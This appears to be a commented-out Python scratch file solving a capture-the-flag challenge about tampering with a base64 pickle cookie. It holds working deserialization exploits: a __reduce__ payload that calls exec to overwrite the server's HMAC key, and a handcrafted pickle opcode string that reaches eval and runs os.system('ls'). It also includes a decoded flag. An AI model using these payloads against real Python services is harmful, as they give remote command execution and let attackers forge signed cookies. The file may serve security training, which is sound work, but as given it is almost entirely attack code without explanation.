
# import pickle 
# import base64
# a="gAN9cQAoWAUAAABtb25leXEBTZABWAcAAABoaXN0b3J5cQJdcQNYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRhWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADQ2NGZiNTE5ZWNjZDkwMDM3Y2E4MDczMTlkNDU3ODZkcQZ1Lg=="
# print(pickle.loads(base64.b64decode(a)))


# import pickle
# import base64
# a={'money': 1000, 'history': ['Yummy smörgåsgurka'], 'anti_tamper_hmac': '464fb519eccd90037ca807319d45786d'}#这不得多来点玩玩，oh no有防篡改 寄
# print(base64.b64encode(pickle.dumps(a)))



# import pickle
# class A():
#     def __reduce__(self):
#         return(exec,("global key;key=b'11111111111111111111111111111111'",)) 
# a=A()
# print(pickle.dumps(a))


# import pickle
# import hmac
# key=b'11111111111111111111111111111111'
# cookies={'money':1000,'history':[]}
# h=hmac.new(key,digestmod='sha1')
# h.update(str(cookies).encode())
# cookies['anti_tamper_hmac']=h.digest().hex()
# print(pickle.dumps(cookies))

# import base64
# a=b"\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u."
# print(base64.b64encode(a))


# import pickle
# import base64
# a=b"gAN9cQAoWAUAAABtb25leXEBTSgjWAcAAABoaXN0b3J5cQJdcQNYKwAAAGZsYWd7MjNmNzZjMTMtNDZhYi00N2M0LTgyMjYtNmUxYzNiN2JkODk0fQpxBGFYEAAAAGFudGlfdGFtcGVyX2htYWNxBVggAAAAZWMzYzA3MGU1MzVhZTk2NzY2YWFjMGI0ZWYzNTZlZGRxBnUu"
# print(pickle.loads(base64.b64decode(a)))


# import base64
# a=b"\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__('\u006f\u0073').system('ls')o00."
# print(base64.b64encode(a))